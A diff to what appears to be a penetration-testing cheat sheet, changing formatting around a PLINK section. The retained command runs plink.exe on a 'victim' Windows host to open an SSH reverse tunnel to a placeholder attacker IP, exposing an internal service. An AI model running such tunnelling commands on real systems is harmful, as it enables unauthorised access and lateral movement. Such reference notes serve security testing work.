@@ -2526,9 +2526,9 @@ pipreqs --force
 
 
 ## PLINK
-```
+```powershell
 # transfer plink.exe to victim, e.g. with certutil
-# forward port remotely from attacker_IP to Windows box
+# remote port forwarding from attacker_IP:listening_port to Windows box:service_port via SSH
 cmd.exe /c echo y | plink.exe -ssh -l user_name_here -pw password_here -R attacker_IP_here:listening_port_here:127.0.0.1:service_port_here attacker_IP_here
 ```
 
